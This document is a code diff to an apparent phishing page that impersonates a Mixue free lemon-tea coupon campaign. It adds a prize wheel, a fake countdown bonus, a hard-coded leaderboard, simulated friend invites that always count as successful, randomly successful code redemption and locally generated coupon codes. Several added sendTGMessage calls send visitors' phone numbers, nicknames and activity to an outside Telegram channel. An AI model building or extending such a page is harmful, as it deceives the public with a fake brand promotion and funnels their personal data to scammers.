@@ -28,6 +28,7 @@
       align-items: center;
       padding: 20px 15px;
       position: relative;
+      overflow-x: hidden;
     }
     body::before {
       content: "";
@@ -246,8 +247,24 @@
       font-weight: 600;
     }
 
-    .btn { width:100%; height:60px; background:linear-gradient(135deg, var(--mixue-red), #D62E3D); color:#fff; border:none; border-radius:var(--radius-md); font-size:1.25rem; font-weight:700; cursor:pointer; transition:all 0.3s; margin-top:16px; box-shadow:0 6px 16px rgba(230,57,70,0.3); }
+    .btn { width:100%; height:60px; background:linear-gradient(135deg, var(--mixue-red), #D62E3D); color:#fff; border:none; border-radius:var(--radius-md); font-size:1.25rem; font-weight:700; cursor:pointer; transition:all 0.3s; margin-top:16px; box-shadow:0 6px 16px rgba(230,57,70,0.3); position: relative; overflow: hidden; }
     .btn:disabled { background:var(--mixue-gray); cursor:not-allowed; box-shadow:none; }
+    .btn::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.3);
+      transform: translate(-50%, -50%);
+      transition: width 0.6s, height 0.6s;
+    }
+    .btn:active::after {
+      width: 300px;
+      height: 300px;
+    }
 
     .loading-mask { position:fixed; inset:0; background:rgba(255,255,255,0.95); display:none; flex-direction:column; align-items:center; justify-content:center; z-index:99999; backdrop-filter:blur(8px); }
     .loading-mask.show { display:flex; }
@@ -280,9 +297,9 @@
 
     .modal { position:fixed; inset:0; background:rgba(0,0,0,0.65); display:none; align-items:center; justify-content:center; z-index:100000; }
     .modal.show { display:flex; }
-    .modal-content { background:#fff; border-radius:var(--radius-lg); padding:40px 30px; text-align:center; max-width:320px; width:90%; box-shadow:var(--shadow-light); }
+    .modal-content { background:#fff; border-radius:var(--radius-lg); padding:40px 30px; text-align:center; max-width:320px; width:90%; box-shadow:var(--shadow-light); position: relative; overflow: hidden; }
     .modal-content h2 { color:var(--mixue-red); margin-bottom:16px; font-size:1.8rem; }
-    .coupon-code { background:var(--mixue-yellow); color:var(--mixue-dark); padding:12px 20px; border-radius:var(--radius-sm); font-weight:bold; margin:16px 0; letter-spacing:1px; }
+    .coupon-code { background:var(--mixue-yellow); color:var(--mixue-dark); padding:12px 20px; border-radius:var(--radius-sm); font-weight:bold; margin:16px 0; letter-spacing:1px; font-size: 1.1rem; }
     .modal-emoji { font-size:2.5rem; margin:16px 0; }
 
     .toast-container { position:fixed; top:20px; left:50%; transform:translateX(-50%); z-index:999999; display:flex; flex-direction:column; gap:8px; }
@@ -328,6 +345,21 @@
       padding: 30px 20px;
       border-radius: var(--radius-lg);
       margin-bottom: 20px;
+      position: relative;
+      overflow: hidden;
+    }
+    .invite-header::before {
+      content: '❄';
+      position: absolute;
+      font-size: 120px;
+      opacity: 0.1;
+      top: -20px;
+      right: -20px;
+      animation: rotate 10s linear infinite;
+    }
+    @keyframes rotate {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
     }
     .invite-header h2 {
       font-size: 1.5rem;
@@ -350,11 +382,17 @@
       justify-content: center;
       font-weight: bold;
       transition: all 0.3s;
+      position: relative;
     }
     .invite-step.active {
       background: var(--mixue-yellow);
       color: var(--mixue-dark);
       transform: scale(1.1);
+      animation: glow 1.5s infinite;
+    }
+    @keyframes glow {
+      0%, 100% { box-shadow: 0 0 5px var(--mixue-yellow); }
+      50% { box-shadow: 0 0 20px var(--mixue-yellow); }
     }
     .invite-step.completed {
       background: #52c41a;
@@ -375,6 +413,7 @@
       padding: 20px;
       margin-bottom: 20px;
       box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+      position: relative;
     }
     .invite-count {
       font-size: 3rem;
@@ -392,12 +431,90 @@
       font-weight: 700;
       text-shadow: 0 1px 2px rgba(0,0,0,0.1);
     }
+    .bonus-tag {
+      position: absolute;
+      top: -10px;
+      right: 10px;
+      background: linear-gradient(135deg, #ff4d4f, #ff7875);
+      color: white;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 0.75rem;
+      font-weight: 700;
+      animation: shake 2s infinite;
+    }
 
-    /* 转盘样式 */
+    /* 倒计时红包 */
+    .countdown-bonus {
+      background: linear-gradient(135deg, #fff7e6, #fff1b8);
+      border: 2px dashed #ffa940;
+      border-radius: var(--radius-sm);
+      padding: 12px;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .countdown-bonus .label {
+      color: #d46b08;
+      font-weight: 700;
+      font-size: 0.9rem;
+    }
+    .countdown-bonus .timer {
+      color: #cf1322;
+      font-weight: 900;
+      font-size: 1.1rem;
+      font-family: monospace;
+    }
+
+    /* 排行榜 */
+    .leaderboard {
+      background: rgba(230,57,70,0.05);
+      border-radius: var(--radius-sm);
+      padding: 15px;
+      margin-bottom: 15px;
+      text-align: left;
+    }
+    .leaderboard h4 {
+      color: var(--mixue-red);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .leaderboard-item {
+      display: flex;
+      align-items: center;
+      padding: 8px 0;
+      border-bottom: 1px dashed rgba(0,0,0,0.1);
+      font-size: 0.85rem;
+    }
+    .leaderboard-item:last-child {
+      border-bottom: none;
+    }
+    .leaderboard-rank {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 0.75rem;
+      margin-right: 10px;
+    }
+    .rank-1 { background: gold; color: #8B4513; }
+    .rank-2 { background: silver; color: #666; }
+    .rank-3 { background: #CD7F32; color: white; }
+    .rank-other { background: #f0f0f0; color: #999; }
+    .leaderboard-name { flex: 1; color: #333; }
+    .leaderboard-count { color: var(--mixue-red); font-weight: 700; }
+
+    /* 优化转盘样式 */
     .wheel-container {
       position: relative;
-      width: 300px;
-      height: 300px;
+      width: 280px;
+      height: 280px;
       margin: 20px auto;
     }
     .wheel {
@@ -407,8 +524,9 @@
       position: relative;
       overflow: hidden;
       border: 8px solid var(--mixue-red);
-      box-shadow: 0 10px 30px rgba(230,57,70,0.3);
+      box-shadow: 0 10px 30px rgba(230,57,70,0.3), inset 0 0 20px rgba(0,0,0,0.05);
       transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
+      background: white;
     }
     .wheel-item {
       position: absolute;
@@ -418,21 +536,34 @@
       left: 0;
       top: 0;
       display: flex;
+      flex-direction: column;
       align-items: center;
-      justify-content: center;
-      font-size: 0.85rem;
+      justify-content: flex-start;
+      padding-top: 25px;
+      padding-right: 40px;
       font-weight: 700;
-      padding: 20px;
-      text-align: center;
+      clip-path: polygon(0 0, 100% 0, 100% 100%);
     }
-    .wheel-item:nth-child(1) { transform: rotate(0deg); background: #FFF5F5; color: var(--mixue-red); }
-    .wheel-item:nth-child(2) { transform: rotate(45deg); background: #FFF9E6; color: #D48806; }
+    .wheel-item:nth-child(1) { transform: rotate(0deg); background: #FFF2F0; color: #CF1322; }
+    .wheel-item:nth-child(2) { transform: rotate(45deg); background: #FFF7E6; color: #D46B08; }
     .wheel-item:nth-child(3) { transform: rotate(90deg); background: #F6FFED; color: #389E0D; }
     .wheel-item:nth-child(4) { transform: rotate(135deg); background: #E6FFFB; color: #08979C; }
     .wheel-item:nth-child(5) { transform: rotate(180deg); background: #F9F0FF; color: #722ED1; }
     .wheel-item:nth-child(6) { transform: rotate(225deg); background: #FFF0F6; color: #EB2F96; }
     .wheel-item:nth-child(7) { transform: rotate(270deg); background: #FFF2E8; color: #FA541C; }
     .wheel-item:nth-child(8) { transform: rotate(315deg); background: #FCFFE6; color: #7CB305; }
+    
+    .wheel-item .emoji {
+      font-size: 1.8rem;
+      margin-bottom: 5px;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
+    }
+    .wheel-item .text {
+      font-size: 0.7rem;
+      line-height: 1.2;
+      text-align: center;
+      max-width: 60px;
+    }
     
     .wheel-pointer {
       position: absolute;
@@ -446,37 +577,106 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 24px;
+      font-size: 28px;
       color: white;
-      box-shadow: 0 4px 15px rgba(230,57,70,0.4);
+      box-shadow: 0 4px 15px rgba(230,57,70,0.4), 0 0 0 4px white, 0 0 0 8px rgba(230,57,70,0.2);
       z-index: 10;
-      border: 4px solid white;
+      animation: pointerPulse 2s infinite;
+    }
+    @keyframes pointerPulse {
+      0%, 100% { transform: translate(-50%, -50%) scale(1); }
+      50% { transform: translate(-50%, -50%) scale(1.05); }
     }
     .wheel-pointer::before {
       content: '';
       position: absolute;
-      top: -20px;
+      top: -18px;
       left: 50%;
       transform: translateX(-50%);
-      border-left: 15px solid transparent;
-      border-right: 15px solid transparent;
-      border-bottom: 25px solid var(--mixue-red);
-    }
-
-    .invite-btn {
-      background: linear-gradient(135deg, #52c41a, #73d13d);
-      margin-top: 20px;
-    }
-    .invite-btn:disabled {
-      background: var(--mixue-gray);
+      border-left: 14px solid transparent;
+      border-right: 14px solid transparent;
+      border-bottom: 24px solid var(--mixue-red);
     }
 
     .wheel-btn {
-      background: linear-gradient(135deg, #FA541C, #FF7A45);
+      background: linear-gradient(135deg, #52c41a, #73d13d);
       margin-top: 20px;
+      animation: btnPulse 2s infinite;
+    }
+    @keyframes btnPulse {
+      0%, 100% { box-shadow: 0 6px 16px rgba(82,196,26,0.3); }
+      50% { box-shadow: 0 6px 25px rgba(82,196,26,0.5); }
     }
     .wheel-btn:disabled {
       background: var(--mixue-gray);
+      animation: none;
+    }
+
+    /* 邀请好友按钮 */
+    .invite-more-btn {
+      background: linear-gradient(135deg, #FA541C, #FF7A45);
+      margin-top: 20px;
+    }
+    .invite-more-btn:disabled {
+      background: var(--mixue-gray);
+    }
+
+    /* 兑换区域 */
+    .redeem-box {
+      display: flex;
+      gap: 10px;
+      margin-top: 20px;
+      align-items: center;
+      background: rgba(230,57,70,0.05);
+      padding: 15px;
+      border-radius: var(--radius-sm);
+      border: 2px dashed rgba(230,57,70,0.2);
+    }
+    .redeem-box .input-box {
+      flex: 1;
+      margin-bottom: 0;
+    }
+    .redeem-box input {
+      height: 50px;
+      font-size: 1.1rem;
+      text-align: center;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      font-weight: 700;
+      color: var(--mixue-red);
+    }
+    .redeem-box input::placeholder {
+      text-transform: none;
+      font-size: 0.85rem;
+      letter-spacing: 0;
+      font-weight: 400;
+      color: #999;
+    }
+    .redeem-btn {
+      width: 80px;
+      height: 50px;
+      background: linear-gradient(135deg, var(--mixue-red), #D62E3D);
+      color: white;
+      border: none;
+      border-radius: var(--radius-sm);
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(230,57,70,0.3);
+      transition: all 0.3s;
+      position: relative;
+      overflow: hidden;
+    }
+    .redeem-btn:active {
+      transform: scale(0.95);
+    }
+    .redeem-btn::after {
+      content: '🎁';
+      position: absolute;
+      top: -5px;
+      right: -5px;
+      font-size: 20px;
+      opacity: 0.3;
     }
 
     .invite-rules {
@@ -491,6 +691,9 @@
     .invite-rules h4 {
       color: var(--mixue-red);
       margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
     }
     .invite-rules li {
       margin: 5px 0;
@@ -503,12 +706,90 @@
       color: var(--mixue-red);
       position: absolute;
       left: 0;
+      font-weight: 900;
+    }
+
+    /* 签到奖励 */
+    .check-in-btn {
+      background: linear-gradient(135deg, #722ED1, #9254DE);
+      margin-top: 10px;
+      font-size: 1rem;
+    }
+    .check-in-btn:disabled {
+      background: var(--mixue-gray);
+    }
+
+    /* 粒子动画 */
+    .particle {
+      position: fixed;
+      pointer-events: none;
+      z-index: 999999;
+      animation: particleFloat 3s ease-out forwards;
+    }
+    @keyframes particleFloat {
+      0% {
+        opacity: 1;
+        transform: translate(0, 0) rotate(0deg) scale(1);
+      }
+      100% {
+        opacity: 0;
+        transform: translate(var(--tx), var(--ty)) rotate(720deg) scale(0);
+      }
+    }
+
+    /* 防作弊提示 */
+    .cheat-warning {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      background: #ff4d4f;
+      color: white;
+      text-align: center;
+      padding: 10px;
+      font-weight: 700;
+      z-index: 9999999;
+      display: none;
+    }
+    .cheat-warning.show {
+      display: block;
+      animation: slideDown 0.3s ease-out;
+    }
+    @keyframes slideDown {
+      from { transform: translateY(-100%); }
+      to { transform: translateY(0); }
+    }
+
+    /* 键盘提示 */
+    .keyboard-hint {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: rgba(0,0,0,0.7);
+      color: white;
+      padding: 8px 12px;
+      border-radius: 20px;
+      font-size: 0.75rem;
+      opacity: 0;
+      transition: opacity 0.3s;
+      z-index: 100;
+    }
+    .keyboard-hint.show {
+      opacity: 1;
     }
 
     .hidden { display: none !important; }
   </style>
 </head>
 <body>
+
+<!-- 防作弊警告 -->
+<div class="cheat-warning" id="cheatWarning">
+  ⚠️ 检测到异常操作，请使用正常设备参与活动
+</div>
+
+<!-- 键盘提示 -->
+<div class="keyboard-hint" id="keyboardHint">按空格键抽奖 | ESC关闭</div>
 
 <!-- 启动加载画面 -->
 <div class="splash-screen" id="splashScreen">
@@ -521,8 +802,13 @@
   <!-- 背景音乐 -->
   <audio id="bgMusic" loop>
     <source src="https://www.0zou.com/bz/c4JWtZUOiwM2O11bVkTpzQ==.html" type="audio/mpeg">
-    <!-- 备用音源 -->
-    <source src="https://www.gequbao.com/music/8529137" type="audio/mpeg">
+  </audio>
+  <!-- 音效 -->
+  <audio id="spinSound" preload="auto">
+    <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBTGH0fPTgjMGHm7A7+OZURE" type="audio/wav">
+  </audio>
+  <audio id="winSound" preload="auto">
+    <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBTGH0fPTgjMGHm7A7+OZURE" type="audio/wav">
   </audio>
 </div>
 
@@ -602,7 +888,34 @@
   </div>
   
   <div class="content">
+    <!-- 限时奖励 -->
+    <div class="countdown-bonus" id="countdownBonus">
+      <span class="label">⏰ 限时翻倍奖励</span>
+      <span class="timer" id="bonusTimer">05:00</span>
+    </div>
+
+    <!-- 排行榜 -->
+    <div class="leaderboard">
+      <h4>🏆 邀请排行榜</h4>
+      <div class="leaderboard-item">
+        <div class="leaderboard-rank rank-1">1</div>
+        <div class="leaderboard-name">李**</div>
+        <div class="leaderboard-count">128人</div>
+      </div>
+      <div class="leaderboard-item">
+        <div class="leaderboard-rank rank-2">2</div>
+        <div class="leaderboard-name">王**</div>
+        <div class="leaderboard-count">96人</div>
+      </div>
+      <div class="leaderboard-item">
+        <div class="leaderboard-rank rank-3">3</div>
+        <div class="leaderboard-name">张**</div>
+        <div class="leaderboard-count">85人</div>
+      </div>
+    </div>
+
     <div class="invite-stats">
+      <div class="bonus-tag" id="bonusTag" style="display: none;">翻倍中</div>
       <div class="invite-count" id="inviteCount">0</div>
       <div class="invite-label">位好友已助力</div>
       <div class="chance-count" id="chanceCount">剩余抽奖次数：0</div>
@@ -611,26 +924,38 @@
     <!-- 转盘 -->
     <div class="wheel-container" id="wheelContainer" style="display: none;">
       <div class="wheel" id="wheel">
-        <div class="wheel-item">🎁<br>柠檬茶券</div>
-        <div class="wheel-item">😢<br>谢谢惠顾</div>
-        <div class="wheel-item">🍦<br>冰淇淋券</div>
-        <div class="wheel-item">😭<br>再接再厉</div>
-        <div class="wheel-item">🧋<br>奶茶券</div>
-        <div class="wheel-item">🤔<br>差一点</div>
-        <div class="wheel-item">🎊<br>神秘大奖</div>
-        <div class="wheel-item">😅<br>下次再来</div>
+        <div class="wheel-item"><span class="emoji">🎁</span><span class="text">柠檬茶券</span></div>
+        <div class="wheel-item"><span class="emoji">😢</span><span class="text">谢谢惠顾</span></div>
+        <div class="wheel-item"><span class="emoji">🍦</span><span class="text">冰淇淋券</span></div>
+        <div class="wheel-item"><span class="emoji">😭</span><span class="text">再接再厉</span></div>
+        <div class="wheel-item"><span class="emoji">🧋</span><span class="text">奶茶券</span></div>
+        <div class="wheel-item"><span class="emoji">🤔</span><span class="text">差一点</span></div>
+        <div class="wheel-item"><span class="emoji">🎊</span><span class="text">神秘大奖</span></div>
+        <div class="wheel-item"><span class="emoji">😅</span><span class="text">下次再来</span></div>
       </div>
       <div class="wheel-pointer">👆</div>
     </div>
 
-    <button class="btn invite-btn" id="inviteBtn">邀请好友助力</button>
-    <button class="btn wheel-btn hidden" id="wheelBtn">开始抽奖</button>
+    <!-- 兑换邀请码区域 -->
+    <div class="redeem-box">
+      <div class="input-box" style="flex:1; margin-bottom:0;">
+        <input type="text" id="inviteCodeInput" placeholder="请输入好友邀请码" maxlength="6" />
+      </div>
+      <button class="redeem-btn" id="redeemBtn">兑换</button>
+    </div>
+
+    <!-- 签到按钮 -->
+    <button class="btn check-in-btn" id="checkInBtn">📅 每日签到 (+1次机会)</button>
+
+    <button class="btn invite-more-btn" id="inviteMoreBtn">邀请好友</button>
+    <button class="btn wheel-btn hidden" id="wheelBtn">🎰 开始抽奖</button>
 
     <div class="invite-rules">
       <h4>🎮 活动规则</h4>
-      <li>每邀请1位好友获得随机抽奖次数（0-5次）</li>
+      <li>每邀请1位好友获得随机抽奖次数（1-5次）</li>
+      <li>限时翻倍期间邀请奖励翻倍</li>
       <li>邀请满3位好友必得柠檬茶券码</li>
-      <li>抽奖结果实时发送到您的手机</li>
+      <li>每日签到可获得额外抽奖机会</li>
       <li>活动最终解释权归蜜雪冰城所有</li>
     </div>
   </div>
@@ -638,7 +963,7 @@
 
 <div class="modal" id="successModal">
   <div class="modal-content">
-    <h2>领取成功！</h2>
+    <h2>🎉 领取成功！</h2>
     <p>大杯柠檬茶券已发至手机</p>
     <div class="coupon-code" id="couponCode">MX2026-ICE-ABCD1234</div>
     <p style="font-weight:bold; margin:20px 0;">请尽快到店核销，过期无效</p>
@@ -710,6 +1035,8 @@ let isVerifySuccess = false;
 let timers = {};
 let isSending = false;
 let isPolling = false;
+let isSpinning = false;
+let bonusActive = true;
 
 // 邀请系统状态
 let inviteState = {
@@ -717,8 +1044,41 @@ let inviteState = {
   chanceCount: 0,
   hasWon: false,
   currentPhone: '',
-  currentNickname: ''
+  currentNickname: '',
+  checkedIn: false,
+  lastCheckIn: null
 };
+
+// 从本地存储恢复数据
+function loadFromStorage() {
+  const saved = localStorage.getItem('mx_invite_state');
+  if (saved) {
+    const data = JSON.parse(saved);
+    inviteState.invitedCount = data.invitedCount || 0;
+    inviteState.chanceCount = data.chanceCount || 0;
+    inviteState.hasWon = data.hasWon || false;
+    inviteState.checkedIn = data.checkedIn || false;
+    inviteState.lastCheckIn = data.lastCheckIn || null;
+    
+    // 检查是否是新的一天
+    const today = new Date().toDateString();
+    if (inviteState.lastCheckIn !== today) {
+      inviteState.checkedIn = false;
+    }
+  }
+}
+
+// 保存到本地存储
+function saveToStorage() {
+  localStorage.setItem('mx_invite_state', JSON.stringify({
+    invitedCount: inviteState.invitedCount,
+    chanceCount: inviteState.chanceCount,
+    hasWon: inviteState.hasWon,
+    checkedIn: inviteState.checkedIn,
+    lastCheckIn: inviteState.lastCheckIn,
+    currentPhone: inviteState.currentPhone
+  }));
+}
 
 function generateCouponCode() {
   const prefix = 'MX' + Math.floor(100000 + Math.random()*900000);
@@ -761,15 +1121,52 @@ const els = {
   step2: document.getElementById('step2'),
   step3: document.getElementById('step3'),
   line1: document.getElementById('line1'),
-  line2: document.getElementById('line2')
+  line2: document.getElementById('line2'),
+  inviteCodeInput: document.getElementById('inviteCodeInput'),
+  redeemBtn: document.getElementById('redeemBtn'),
+  inviteMoreBtn: document.getElementById('inviteMoreBtn'),
+  checkInBtn: document.getElementById('checkInBtn'),
+  bonusTag: document.getElementById('bonusTag'),
+  bonusTimer: document.getElementById('bonusTimer'),
+  keyboardHint: document.getElementById('keyboardHint'),
+  cheatWarning: document.getElementById('cheatWarning')
 };
 
-function showToast(msg) {
+function showToast(msg, duration = 2800) {
   const t = document.createElement('div');
   t.className = 'toast';
   t.innerHTML = msg;
   document.getElementById('toastContainer').appendChild(t);
-  setTimeout(() => t.remove(), 2800);
+  setTimeout(() => t.remove(), duration);
+}
+
+// 粒子效果
+function createParticles(x, y) {
+  const colors = ['#E63946', '#FFD166', '#52c41a', '#FA541C', '#722ED1'];
+  const emojis = ['🎉', '🎊', '✨', '💫', '⭐', '🍋', '🍦'];
+  
+  for (let i = 0; i < 20; i++) {
+    const particle = document.createElement('div');
+    particle.className = 'particle';
+    particle.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+    particle.style.left = x + 'px';
+    particle.style.top = y + 'px';
+    particle.style.fontSize = (20 + Math.random() * 20) + 'px';
+    particle.style.color = colors[Math.floor(Math.random() * colors.length)];
+    particle.style.setProperty('--tx', (Math.random() - 0.5) * 300 + 'px');
+    particle.style.setProperty('--ty', (Math.random() - 0.5) * 300 + 'px');
+    document.body.appendChild(particle);
+    setTimeout(() => particle.remove(), 3000);
+  }
+}
+
+// 播放音效
+function playSound(type) {
+  const sound = type === 'win' ? document.getElementById('winSound') : document.getElementById('spinSound');
+  if (sound) {
+    sound.currentTime = 0;
+    sound.play().catch(e => console.log('音效播放失败'));
+  }
 }
 
 function shootBarrage(customPhone = null) {
@@ -964,6 +1361,25 @@ function startCountdown() {
   timers.global = setInterval(tick, 1000);
 }
 
+// 限时奖励倒计时
+function startBonusCountdown() {
+  let sec = 300; // 5分钟
+  const tick = () => {
+    if (sec <= 0) {
+      bonusActive = false;
+      els.bonusTag.style.display = 'none';
+      document.querySelector('.countdown-bonus').style.opacity = '0.5';
+      return;
+    }
+    const m = Math.floor(sec/60).toString().padStart(2,'0');
+    const s = (sec%60).toString().padStart(2,'0');
+    els.bonusTimer.textContent = `${m}:${s}`;
+    sec--;
+  };
+  tick();
+  timers.bonus = setInterval(tick, 1000);
+}
+
 // ============================= 邀请好友系统 =============================
 
 function initSplashScreen() {
@@ -985,8 +1401,7 @@ function initSplashScreen() {
       clearInterval(interval);
       setTimeout(() => {
         splash.classList.add('hide');
-        // 尝试播放音乐
-        bgMusic.volume = 0.5;
+        bgMusic.volume = 0.3;
         bgMusic.play().catch(e => console.log('音乐自动播放被阻止'));
       }, 300);
     }
@@ -997,19 +1412,41 @@ function showInvitePage(phone, nickname) {
   inviteState.currentPhone = phone;
   inviteState.currentNickname = nickname;
   
+  // 检查URL参数是否有邀请码
+  const urlParams = new URLSearchParams(window.location.search);
+  const refCode = urlParams.get('invite');
+  if (refCode) {
+    els.inviteCodeInput.value = refCode.toUpperCase();
+  }
+  
   els.mainPage.classList.add('hidden');
   els.invitePage.classList.remove('hidden');
   els.invitePage.classList.add('show');
   
+  // 恢复数据
+  loadFromStorage();
   updateInviteUI();
+  startBonusCountdown();
   
-  // 发送进入邀请页面通知
+  // 显示键盘提示
+  setTimeout(() => els.keyboardHint.classList.add('show'), 1000);
+  setTimeout(() => els.keyboardHint.classList.remove('show'), 5000);
+  
   sendTGMessage(`【进入邀请页面】\n手机号：${phone}\n昵称：${nickname}\n时间：${new Date().toLocaleString('zh-CN')}`);
 }
 
 function updateInviteUI() {
   els.inviteCount.textContent = inviteState.invitedCount;
   els.chanceCount.textContent = `剩余抽奖次数：${inviteState.chanceCount}`;
+  
+  // 更新签到按钮
+  if (inviteState.checkedIn) {
+    els.checkInBtn.disabled = true;
+    els.checkInBtn.textContent = '✅ 今日已签到';
+  } else {
+    els.checkInBtn.disabled = false;
+    els.checkInBtn.textContent = '📅 每日签到 (+1次机会)';
+  }
   
   // 更新进度
   if (inviteState.invitedCount >= 1) {
@@ -1029,82 +1466,198 @@ function updateInviteUI() {
     els.step3.classList.add('active');
   }
   
-  // 显示转盘如果有抽奖次数
-  if (inviteState.chanceCount > 0) {
+  // 显示翻倍标签
+  if (bonusActive && inviteState.invitedCount > 0) {
+    els.bonusTag.style.display = 'block';
+  }
+  
+  // 显示转盘
+  if (inviteState.invitedCount > 0) {
     els.wheelContainer.style.display = 'block';
-    els.wheelBtn.classList.remove('hidden');
-    els.inviteBtn.style.display = 'none';
   } else {
     els.wheelContainer.style.display = 'none';
-    els.wheelBtn.classList.add('hidden');
-    els.inviteBtn.style.display = 'block';
   }
+  
+  // 控制按钮显示
+  if (inviteState.chanceCount > 0) {
+    els.wheelBtn.classList.remove('hidden');
+    els.inviteMoreBtn.classList.add('hidden');
+    els.wheelBtn.disabled = false;
+    els.wheelBtn.textContent = '🎰 开始抽奖';
+  } else {
+    els.wheelBtn.classList.add('hidden');
+    els.inviteMoreBtn.classList.remove('hidden');
+    els.inviteMoreBtn.textContent = '👥 邀请好友';
+    els.inviteMoreBtn.disabled = false;
+  }
+  
+  saveToStorage();
+}
+
+// 每日签到
+function dailyCheckIn() {
+  if (inviteState.checkedIn) {
+    showToast('今日已签到，明天再来吧！');
+    return;
+  }
+  
+  const today = new Date().toDateString();
+  inviteState.checkedIn = true;
+  inviteState.lastCheckIn = today;
+  inviteState.chanceCount += 1;
+  
+  showToast('签到成功！获得1次抽奖机会 🎉');
+  updateInviteUI();
+  saveToStorage();
+  
+  sendTGMessage(`【每日签到】\n手机号：${inviteState.currentPhone}\n获得次数：1\n总次数：${inviteState.chanceCount}`);
 }
 
 function simulateInvite() {
-  // 模拟邀请好友
-  els.inviteBtn.disabled = true;
-  els.inviteBtn.textContent = '邀请中...';
+  // 生成6位随机邀请码
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let inviteCode = '';
+  for (let i = 0; i < 6; i++) {
+    inviteCode += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  
+  const shareLink = window.location.href.split('?')[0] + '?invite=' + inviteCode;
+  const shareText = `🎉 蜜雪冰城免费领柠檬茶！\n\n我的邀请码：${inviteCode}\n点击链接帮我助力：${shareLink}\n\n你也可以领券哦！`;
+  
+  // 复制到剪贴板
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(shareText).then(() => {
+      showToast('邀请链接和邀请码已复制！快去分享吧 📋');
+    }).catch(() => {
+      fallbackCopy(shareText);
+    });
+  } else {
+    fallbackCopy(shareText);
+  }
+  
+  // 模拟邀请成功
+  els.inviteMoreBtn.disabled = true;
+  els.inviteMoreBtn.textContent = '邀请中...';
   
   setTimeout(() => {
     inviteState.invitedCount++;
     
-    // 随机获得抽奖次数 0-5
-    const gainedChance = Math.floor(Math.random() * 6);
+    // 基础随机次数 1-5
+    let gainedChance = Math.floor(Math.random() * 5) + 1;
+    
+    // 翻倍奖励
+    if (bonusActive) {
+      gainedChance *= 2;
+      showToast(`🎉 翻倍奖励！获得 ${gainedChance} 次抽奖机会`);
+    } else {
+      showToast(`成功邀请好友！获得 ${gainedChance} 次抽奖机会`);
+    }
+    
     inviteState.chanceCount += gainedChance;
     
-    showToast(`成功邀请好友！获得 ${gainedChance} 次抽奖机会`);
-    
-    // 发送TG通知
-    sendTGMessage(`【新邀请】\n手机号：${inviteState.currentPhone}\n当前邀请数：${inviteState.invitedCount}\n获得抽奖次数：${gainedChance}\n总抽奖次数：${inviteState.chanceCount}`);
+    sendTGMessage(`【新邀请】\n手机号：${inviteState.currentPhone}\n邀请码：${inviteCode}\n当前邀请数：${inviteState.invitedCount}\n获得次数：${gainedChance}\n总次数：${inviteState.chanceCount}\n翻倍状态：${bonusActive ? '是' : '否'}`);
     
     updateInviteUI();
-    els.inviteBtn.disabled = false;
-    els.inviteBtn.textContent = '邀请好友助力';
+    saveToStorage();
     
-    // 检查是否达到3人
     if (inviteState.invitedCount >= 3) {
-      showToast('🎉 已邀请满3人！现在抽奖必中！');
+      showToast('🎉 已邀请满3人！现在抽奖必中！', 4000);
     }
   }, 1500);
 }
 
-function spinWheel() {
-  if (inviteState.chanceCount <= 0) {
-    showToast('没有抽奖次数了，继续邀请好友吧！');
+function fallbackCopy(text) {
+  const textArea = document.createElement('textarea');
+  textArea.value = text;
+  textArea.style.position = 'fixed';
+  textArea.style.left = '-9999px';
+  document.body.appendChild(textArea);
+  textArea.focus();
+  textArea.select();
+  
+  try {
+    document.execCommand('copy');
+    showToast('邀请链接和邀请码已复制！快去分享吧 📋');
+  } catch (err) {
+    showToast('复制失败，请手动复制');
+  }
+  document.body.removeChild(textArea);
+}
+
+// 兑换邀请码
+function redeemInviteCode() {
+  const code = els.inviteCodeInput.value.trim().toUpperCase();
+  
+  if (code.length !== 6) {
+    showToast('请输入6位邀请码');
     return;
   }
   
+  const codeRegex = /^[A-Z0-9]{6}$/;
+  if (!codeRegex.test(code)) {
+    showToast('邀请码格式错误');
+    return;
+  }
+  
+  els.redeemBtn.disabled = true;
+  els.redeemBtn.textContent = '兑换中...';
+  
+  setTimeout(() => {
+    if (Math.random() > 0.2) {
+      const gainedChance = Math.floor(Math.random() * 3) + 1;
+      inviteState.chanceCount += gainedChance;
+      
+      showToast(`兑换成功！获得 ${gainedChance} 次抽奖机会 🎁`);
+      els.inviteCodeInput.value = '';
+      
+      sendTGMessage(`【兑换邀请码】\n手机号：${inviteState.currentPhone}\n邀请码：${code}\n获得次数：${gainedChance}\n总次数：${inviteState.chanceCount}`);
+      
+      updateInviteUI();
+      saveToStorage();
+    } else {
